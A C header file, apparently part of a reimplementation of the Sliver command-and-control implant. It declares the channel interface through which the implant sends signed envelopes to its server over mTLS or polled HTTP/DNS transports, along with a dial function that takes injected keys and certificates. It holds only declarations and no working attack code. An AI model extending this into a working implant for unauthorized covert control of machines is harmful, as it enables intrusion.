/* sliver/channel.h - message-level channel abstraction.
 *
 * A channel moves whole signed Envelopes, not raw bytes. This is the seam the
 * schedulers (session / beacon) are written against, so a new transport only
 * needs a new channel implementation:
 *
 *   STREAM  mtls, wg   - long-lived, the peer may open streams at will
 *   POLL    http, dns  - one request/response round trip carries a batch
 *
 * The mTLS pipeline (TLS -> "MUX/1" -> yamux -> signed frame) is an
 * implementation detail of channel_mtls.c and must not leak into modes/.
 */
#ifndef SLIVER_CHANNEL_H
#define SLIVER_CHANNEL_H

#include <stddef.h>
#include <stdint.h>

#include "sliver/proto.h"

#ifdef __cplusplus
extern "C" {
#endif

typedef enum {
  SLIVER_CHANNEL_STREAM = 0, /* duplex: send + blocking recv */
  SLIVER_CHANNEL_POLL = 1    /* request/response: send + poll */
} sliver_channel_kind_t;

typedef struct sliver_channel sliver_channel_t;

struct sliver_channel {
  sliver_channel_kind_t kind;
  /* Human readable link description, e.g. "TLSv1.3 / TLS1-3-CHACHA20-...". */
  const char *(*describe)(sliver_channel_t *c);

  /* Sends one signed Envelope (envelope bytes, not the payload). 0 on success. */
  int (*send)(sliver_channel_t *c, const void *envelope, size_t len);

  /* STREAM only. Returns:
   *   0  an envelope was read into env_out (caller owns env_out->data)
   *   1  the link is gone (peer closed / accept failed): stop the loop
   *  -1  the frame was unusable but the link may still be alive: continue */
  int (*recv)(sliver_channel_t *c, sliver_buf_t *env_out);

  /* POLL only: one round trip carrying up to out_count envelopes and returning
   * up to in_cap replies. NULL for STREAM channels. */
  int (*poll)(sliver_channel_t *c, const sliver_buf_t *out, size_t out_count,
              sliver_buf_t *in, size_t in_cap, size_t *in_count);

  /* Releases the link (safe to call once). */
  void (*close)(sliver_channel_t *c);

  void *state;
};

/* Establishes a channel using the injected material. Picks the implementation
 * from the C2 URL scheme (only mtls is implemented today). On success *out is
 * set and 0 returned; otherwise -1 with a printable reason in err. */
int sliver_channel_dial(const char *host, uint16_t port, const char *ca_pem,
                        const char *cert_pem, const char *key_pem,
                        const char *age_private_key, const char *server_minisign_pubkey,
                        sliver_channel_t **out, char *err, size_t err_len);

/* Closes and frees a channel returned by sliver_channel_dial. */
void sliver_channel_free(sliver_channel_t *c);

#ifdef __cplusplus
}
#endif

#endif /* SLIVER_CHANNEL_H */
